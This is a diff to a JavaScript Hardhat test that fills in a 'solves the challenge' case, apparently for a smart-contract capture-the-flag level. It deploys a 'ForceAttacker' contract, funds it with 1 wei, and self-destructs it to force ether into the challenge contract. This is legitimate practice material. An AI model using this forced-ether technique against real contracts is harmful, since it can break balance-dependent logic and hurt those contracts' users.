@@ -20,6 +20,15 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+  
+  const attackerFactory = await ethers.getContractFactory('ForceAttacker')
+  let attacker = await attackerFactory.connect(eoa).deploy()
+
+  eoa.sendTransaction({to:attacker.address, value:1})
+
+  await attacker.connect(eoa).selfDestruct(challenge.address)
+  console.log(await ethers.provider.getBalance(challenge.address))
+
 });
 
 after(async () => {
